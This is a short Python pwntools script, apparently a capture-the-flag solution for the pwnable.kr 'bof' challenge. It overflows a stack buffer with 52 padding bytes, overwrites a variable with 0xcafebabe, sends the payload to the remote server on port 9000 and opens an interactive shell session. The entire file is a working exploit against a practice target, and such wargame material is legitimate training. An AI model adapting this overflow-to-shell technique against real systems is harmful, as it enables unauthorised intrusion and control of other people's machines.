from pwn import *

#p = process('./bof')
r = remote('pwnable.kr',9000)


payload = b'a'*52
payload += p32(0xcafebabe)

#p.sendlineafter(b'overflow me :',payload)
r.sendline(payload)

r.interactive()